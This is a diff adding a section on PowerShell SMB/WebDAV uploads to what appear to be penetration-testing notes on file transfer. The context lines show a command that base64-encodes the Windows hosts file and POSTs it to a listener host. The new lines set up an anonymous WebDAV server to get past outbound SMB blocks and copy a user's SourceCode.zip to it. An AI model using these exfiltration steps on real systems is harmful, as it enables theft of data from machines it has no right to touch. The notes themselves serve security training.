@@ -152,3 +152,19 @@ listening on [any] 8000 ...
 PS C:\user> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 PS C:\user> Invoke-WebRequest -Uri http://172.24.121.19:8000/ -Method POST -Body $b64
 ```
+
+## 3) PowerShell SMB Uploads
+
+- most encrionment will prevent outgoing smb connection so we can use The WebDAV protocol , which enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
+
+- other than that we can use the same method in download section
+```bash
+$ sudo pip install wsgidav cheroot
+$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+```
+
+```powershell
+PS C:\user> dir \\192.168.49.128\DavWWWRoot
+
+PS C:\user> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+```
